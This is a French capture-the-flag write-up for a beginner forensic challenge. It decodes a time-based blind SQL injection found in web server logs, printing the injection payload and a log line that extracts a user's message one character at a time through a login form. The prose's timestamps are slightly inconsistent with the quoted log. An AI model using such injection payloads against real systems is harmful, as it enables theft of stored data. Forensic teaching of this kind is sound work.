# HelpMe

Auteur : ShockedPlot7560
Type : Forensic/Dev
***Difficulté : Débutant***

### Enoncé : 

On vient de poutrer votre application web. En plus des dégâts faits à votre infrastructure, vous remarquez quelque chose d'étrange dans vos logs.

Sauriez-vous retrouver les données que l'attaquant a réussies à exfiltrer ?

## Solution

Dans ce challenge, une étape d'observation était nécessaire pour comprendre la requête SQL qui était injecté:
```
'%20or%20if((select%20SUBSTRING(message,33,1)%20from%20messages%20where%20user_id=1%20limit%200,1)='V',%20sleep(3),%20null)--%20
// url décodé
' or if((select SUBSTRING(message,33,1) from messages where user_id=1 limit 0,1)='V', sleep(3), null)-- 
```
On pouvait donc voir que la requête venait tenter caractère par caractère le contenu du message de l'utilisateur 1. Si le caractère était égal à celui donné, le serveur attendait 3 secondes avant de répondre. Ainsi, en brute forcant, on pouvait récupérer le contenu du message caractère par caractère.  

En prenant un moment au hasard où le caractère venait d'être extrait on a : 
```
[Mon Dec 11 18:17:33 2023] 172.29.0.1:52064 Accepted
[Mon Dec 11 18:17:36 2023] 172.29.0.1:52064 [200]: GET /login.php?username='%20or%20if((select%20SUBSTRING(message,19,1)%20from%20messages%20where%20user_id=1%20limit%200,1)='F',%20sleep(3),%20null)--%20&password=
[Mon Dec 11 18:17:36 2023] 172.29.0.1:52064 Closing
```

Ainsi, on peut voir qu'à 36 secondes, le serveur accepte une connexion venant de 172.29.0.1 (le début donc de la requête). Puis, à 39 secondes, le serveur répond avec un code 200. 3 secondes se sont écoulés, l'attaquant peut donc en déduire que le 19e caractère est égal à `F`.